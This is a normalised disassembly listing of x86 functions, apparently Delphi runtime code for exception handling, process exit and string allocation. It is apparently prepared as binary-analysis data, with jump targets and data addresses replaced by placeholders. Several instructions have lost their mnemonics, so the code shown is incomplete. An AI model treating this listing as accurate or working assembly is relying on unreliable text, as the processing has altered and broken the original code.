mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403234
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403680
jmp edx
sub_403a6c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b0c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
xor eax eax
retn
cmp [ rw-data ] 0x0
ja r-xdata
mov eax [ esp + 0x4 ]
cld
call sub_403160
mov edx [ esp + 0x8 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov ebx [ esp + 0x4 ]
cmp [ ebx ] 0xeedfade
mov edx [ ebx + 0x14 ]
mov eax [ ebx + 0x18 ]
je r-xdata
lea eax [ esp + 0x4 ]
push eax
call UnhandledExceptionFilter
cmp eax 0x0
je r-xdata
call sub_40369c
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edx [ rw-data ]
test edx edx
je sub_403a6c
mov ecx [ esp + 0x4 ]
mov eax 0xd9
mov edx [ ecx + 0x14 ]
mov [ esp ] edx
jmp sub_403f60
call ecx
mov eax ebx
call edx
test eax eax
je sub_403a6c
mov edx [ ebx + 0xc ]
sub_403bcc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403bf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c3a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c9a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403cf4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405a6c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d18
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405a6c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d40
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d64
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403dc0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403df0
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403e7c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d64
call sub_403df0
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403bf4
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403bcc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405538
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403dc0
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f6c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403f90
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403fc0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404030
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404004
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404030
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40405c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404030
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f6c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_40408c
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040ac
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4040c8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f6c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045b8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40408c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_40408c
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045b8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40405c
jmp r-xdata
sub_404164
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40405c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404194
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040c8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4041dc
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40405c
not ecx
sub_404208
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_404234
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403fc0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045b8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045b8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_404278
test edx edx
je r-xdata
mov edx ecx
jmp sub_403fc0
test ecx ecx
je sub_403fc0
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404234
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404030
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403fc0
pop edx
pop eax
jmp sub_404234
call sub_403fc0
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042ec
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404030
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045b8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403fc0
dec [ edx - 0x8 ]
sub_404378
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404438
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404030
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_40448c
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f6c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40405c
jmp r-xdata
pop ebx
retn 0x4
sub_4044cc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404438#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045b8
mov edi ecx
sub_404514
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045b8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404570
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045b8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f6c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404030
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404664
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404688
test edx edx
je sub_40464c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40464c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_4046ac
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40464c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404894
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040ac
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040ac
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404894
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404738
jmp r-xdata
sub_404738
test ecx ecx
je sub_40464c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_40475c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404738
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4047c4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404848
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4047b8
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404738
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404894
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40463c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404624
mov ebx eax
mov eax [ edi ]
call sub_4047b8
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_4048d8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404908
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404908
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404908
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048d8
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_40499c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049e8
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4049e8
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f90
jmp r-xdata
call sub_403f6c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404664
jmp r-xdata
call sub_40464c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4049d0
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049e8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40499c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4055a8
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404efc
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404af8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_403fc0
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404688
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404ae0
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c14
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404af8
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4055c0
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404f38
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c14
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
